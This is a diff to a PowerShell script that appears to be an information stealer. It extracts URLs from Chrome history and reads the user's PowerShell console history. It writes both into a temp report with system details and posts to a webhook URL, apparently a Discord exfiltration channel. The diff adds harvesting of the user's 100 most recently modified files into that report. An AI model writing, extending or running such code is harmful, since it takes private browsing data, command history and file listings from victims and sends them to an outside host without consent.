@@ -52,6 +52,7 @@ $Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:U
 $Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
 $Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 
 $outpath = "$env:temp\systeminfo.txt"
 "--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $outpath -Encoding ASCII
@@ -75,6 +76,8 @@ $outpath = "$env:temp\systeminfo.txt"
 ($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
